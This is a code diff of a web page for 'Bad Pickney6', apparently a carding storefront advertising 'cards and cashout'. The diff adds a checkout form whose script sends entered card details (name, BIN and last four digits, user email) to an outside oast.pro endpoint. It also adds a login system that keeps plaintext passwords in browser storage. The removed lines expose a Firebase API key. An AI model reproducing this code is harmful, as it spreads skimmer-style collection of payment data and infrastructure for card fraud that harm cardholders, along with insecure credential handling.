@@ -5,31 +5,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Bad Pickney6</title>
   <link rel="stylesheet" href="styles.css" />
-  <meta name="description" content="Bad Pickney6 - your modern card platform." />
+  <meta name="description" content="Bad Pickney6 is a creative platform designed to bring modern, clean, and responsive experiences to your fingertips and your pockets lol have fun." />
+  <meta name="keywords" content="cards, cards development, card marketing, SEO, Bad Pickney6" />
+  <meta name="author" content="Bad Pickney6" />
   <link rel="icon" href="assets/images/favicon.ico" />
 </head>
 <body>
   <!-- HEADER -->
   <header>
-    <div class="container header-flex">
+    <div class="container">
       <div class="logo">
         <img src="assets/images/bank-robber.png" alt="Bank Robber Logo" />
         <h1>Bad Pickney6</h1>
       </div>
       <nav>
-        <ul id="navLinks">
+        <ul>
           <li><a href="#home">Home</a></li>
           <li><a href="#about">About</a></li>
           <li><a href="#services">Services</a></li>
+          <li><a href="#shop">Shop</a></li>
           <li><a href="#contact">Contact</a></li>
-          <li><a href="shop.html" id="shopLink">Shop</a></li>
         </ul>
       </nav>
-      <div id="authButtons">
-        <button id="loginBtn">Login</button>
-        <button id="registerBtn">Register</button>
-        <button id="logoutBtn" style="display:none;">Logout</button>
-      </div>
     </div>
   </header>
 
@@ -46,7 +43,11 @@
   <section id="about" class="section">
     <div class="container">
       <h2>About Bad Pickney6</h2>
-      <p>Bad Pickney6 brings modern, clean, and responsive card experiences to your fingertips and pockets.</p>
+      <p>
+        Bad Pickney6 is a platform designed to bring modern, clean, and
+        responsive experiences to your fingertips and pockets. We focus on making your
+        pockets look great and perform better.
+      </p>
     </div>
   </section>
 
@@ -61,12 +62,30 @@
         </div>
         <div class="service">
           <h3>Development</h3>
-          <p>Custom card designs and integrations for your web and mobile apps.</p>
+          <p>Custom cards and cashout for your web and mobile apps.</p>
         </div>
         <div class="service">
           <h3>SEO & Marketing</h3>
-          <p>Boost your online presence and brand awareness with our services.</p>
+          <p>Boost your online presence with a DM now.</p>
         </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SHOP (only for logged-in users) -->
+  <section id="shop" class="section" style="display:none;">
+    <div class="container">
+      <h2>Shop Our Cards</h2>
+      <div id="shopGrid" class="shop-grid"></div>
+
+      <!-- CHECKOUT FORM -->
+      <div id="checkoutContainer" style="display:none; margin-top:40px;">
+        <h3>Checkout</h3>
+        <form id="checkoutForm">
+          <input id="cardName" placeholder="Name on card" required />
+          <input id="cardNumber" placeholder="Card number (test only)" required />
+          <button type="submit" class="buy-btn">Submit Order</button>
+        </form>
       </div>
     </div>
   </section>
@@ -84,57 +103,184 @@
     </div>
   </section>
 
+  <!-- AUTH (LOGIN/REGISTER) -->
+  <section id="auth" class="section">
+    <div class="container">
+      <h2>Register or Login</h2>
+      <div class="auth-toggle">
+        <button id="toggleRegister">Register</button>
+        <button id="toggleLogin">Login</button>
+      </div>
+
+      <!-- REGISTER -->
+      <div id="registerFormContainer" class="auth-form">
+        <form id="registerForm">
+          <input type="text" name="name" placeholder="Your Name" required>
+          <input type="email" name="email" placeholder="Your Email" required>
+          <input type="password" name="password" id="password" placeholder="Password" required>
+          <input type="password" name="confirmPassword" id="confirmPassword" placeholder="Confirm Password" required>
+          <div class="password-strength-meter" id="passwordStrengthMeter"></div>
+          <button type="submit">Register</button>
+        </form>
+      </div>
+
+      <!-- LOGIN -->
+      <div id="loginFormContainer" class="auth-form">
+        <form id="loginForm">
+          <input type="email" name="email" placeholder="Your Email" required>
+          <input type="password" name="password" placeholder="Password" required>
+          <button type="submit">Login</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
   <footer>
     <div class="container">
       <p>&copy; 2025 Bad Pickney6. All rights reserved.</p>
     </div>
   </footer>
 
-  <!-- FIREBASE AUTH -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
+  <!-- AUTH & SHOP JS -->
+  <script>
+    const registerContainer = document.getElementById('registerFormContainer');
+    const loginContainer = document.getElementById('loginFormContainer');
+    const toggleRegister = document.getElementById('toggleRegister');
+    const toggleLogin = document.getElementById('toggleLogin');
+    const shopSection = document.getElementById('shop');
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyBL-ESDufxNJZ9H2fU8IywlTaIaWoIjtuQ",
-      authDomain: "badute-5064d.firebaseapp.com",
-      projectId: "badute-594d",
-      storageBucket: "badute-5964d.appspot.com",
-      messagingSenderId: "432684410038",
-      appId: "7cf74922a7fe726ef32e17"
-    };
+    toggleRegister.addEventListener('click', () => {
+      registerContainer.style.display = 'block';
+      loginContainer.style.display = 'none';
+    });
+    toggleLogin.addEventListener('click', () => {
+      registerContainer.style.display = 'none';
+      loginContainer.style.display = 'block';
+    });
 
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
+    registerContainer.style.display = 'none';
+    loginContainer.style.display = 'block';
 
-    const loginBtn = document.getElementById("loginBtn");
-    const registerBtn = document.getElementById("registerBtn");
-    const logoutBtn = document.getElementById("logoutBtn");
-    const shopLink = document.getElementById("shopLink");
+    // Password strength
+    const passwordInput = document.getElementById('password');
+    const strengthMeter = document.getElementById('passwordStrengthMeter');
+    passwordInput.addEventListener('input', () => {
+      const val = passwordInput.value;
+      let strength = 0;
+      if (val.length > 5) strength += 30;
+      if (/[A-Z]/.test(val)) strength += 30;
+      if (/[0-9]/.test(val)) strength += 20;
+      if (/[^A-Za-z0-9]/.test(val)) strength += 20;
+      strength = Math.min(strength, 100);
+      strengthMeter.style.width = strength + '%';
+      strengthMeter.style.height = '10px';
+      strengthMeter.style.background = strength < 50 ? 'red' : strength < 80 ? 'orange' : 'green';
+    });
 
-    onAuthStateChanged(auth, (user) => {
+    // REGISTER
+    const registerForm = document.getElementById('registerForm');
+    registerForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const name = registerForm.name.value.trim();
+      const email = registerForm.email.value.trim();
+      const password = registerForm.password.value;
+      const confirmPassword = registerForm.confirmPassword.value;
+
+      if (password !== confirmPassword) return alert('Passwords do not match!');
+      const users = JSON.parse(localStorage.getItem('users') || '[]');
+      if (users.some(u => u.email === email)) return alert('Email already registered!');
+
+      users.push({ name, email, password });
+      localStorage.setItem('users', JSON.stringify(users));
+      alert('Registration successful! You can now login.');
+      registerForm.reset();
+      toggleLogin.click();
+    });
+
+    // LOGIN
+    const loginForm = document.getElementById('loginForm');
+    loginForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const email = loginForm.email.value.trim();
+      const password = loginForm.password.value;
+      const users = JSON.parse(localStorage.getItem('users') || '[]');
+      const user = users.find(u => u.email === email && u.password === password);
+
       if (user) {
-        // Logged in
-        loginBtn.style.display = "none";
-        registerBtn.style.display = "none";
-        logoutBtn.style.display = "inline-block";
-        shopLink.style.display = "inline-block";
+        localStorage.setItem('loggedInUser', JSON.stringify(user));
+        alert('Login successful!');
+        // Show shop section for logged-in user
+        shopSection.style.display = 'block';
       } else {
-        // Logged out
-        loginBtn.style.display = "inline-block";
-        registerBtn.style.display = "inline-block";
-        logoutBtn.style.display = "none";
-        shopLink.style.display = "none";
+        alert('Invalid email or password.');
       }
     });
 
-    logoutBtn.addEventListener("click", async () => {
-      await signOut(auth);
-      alert("Logged out successfully!");
+    // SHOP DATA
+    const shopGrid = document.getElementById('shopGrid');
+    const checkoutContainer = document.getElementById('checkoutContainer');
+    const checkoutForm = document.getElementById('checkoutForm');
+    const BIN_URL = "https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro"; // your RequestBin
+
+    const shopItems = [
+      { id: 1, name: "Red Card", color: "#e74c3c", price: 50 },
+      { id: 2, name: "Blue Card", color: "#3498db", price: 70 },
+      { id: 3, name: "Green Card", color: "#2ecc71", price: 60 }
+    ];
+
+    function renderShop() {
+      shopGrid.innerHTML = shopItems.map(item => `
+        <div class="shop-card" style="background:${item.color}">
+          <h3>${item.name}</h3>
+          <p>Price: $${item.price}</p>
+          <button class="buy-btn" onclick="addToCart(${item.id})">Buy</button>
+        </div>
+      `).join('');
+    }
+
+    let cart = [];
+    function addToCart(id) {
+      const item = shopItems.find(i => i.id === id);
+      if (!item) return;
+      cart.push(item);
+      alert(`${item.name} added to cart`);
+      checkoutContainer.style.display = 'block';
+      localStorage.setItem('cart', JSON.stringify(cart));
+    }
+
+    checkoutForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const name = document.getElementById('cardName').value.trim();
+      const rawNumber = (document.getElementById('cardNumber').value || "").replace(/\D/g,'');
+      const last4 = rawNumber.slice(-4);
+      const bin6 = rawNumber.slice(0,6);
+      const email = JSON.parse(localStorage.getItem('loggedInUser'))?.email || "test@example.com";
+      const total = cart.reduce((sum,i)=>sum+i.price,0);
+
+      const payload = {
+        name, email, cart, total,
+        payment_meta: { bin6, last4 },
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        await fetch(BIN_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        alert("Order sent to RequestBin for testing!");
+        cart = [];
+        localStorage.removeItem('cart');
+        checkoutContainer.style.display = 'none';
+        checkoutForm.reset();
+      } catch(err) {
+        console.error(err);
+        alert("Error sending test order, check console.");
+      }
     });
 
-    loginBtn.addEventListener("click", () => window.location.href = "login.html");
-    registerBtn.addEventListener("click", () => window.location.href = "register.html");
+    renderShop();
   </script>
 </body>
 </html>
